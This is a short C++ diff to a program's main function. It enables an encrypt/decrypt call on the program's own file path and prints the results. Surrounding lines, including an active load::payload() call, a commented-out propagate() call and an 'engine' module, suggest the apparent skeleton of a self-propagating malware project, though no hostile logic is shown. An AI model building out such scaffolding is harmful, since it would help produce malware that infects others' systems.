@@ -2,6 +2,7 @@
 #include "fmanip/fmanip.h"
 #include "body/body.h"
 #include "body/path/path.h"
+#include "body/engine/engine.h"
 #include <iostream>
 /**
    * \mainpage
@@ -24,9 +25,11 @@ int main() {
   //body::propagate();
   load::payload();
   std::string pth = path::get_selfpath();
-  //std::string enc = engine::encrypt_Decrypt(pth, 'm');
+  std::string enc = engine::encrypt_Decrypt(pth, 'm');
+  std::string enc2 = engine::encrypt_Decrypt(enc, 'm');
   std::cout<<pth<<std::endl;
-  //std::cout<<enc<<std::endl;
+  std::cout<<enc<<std::endl;
+  std::cout<<enc2<<std::endl;
   return 0;
 }
 
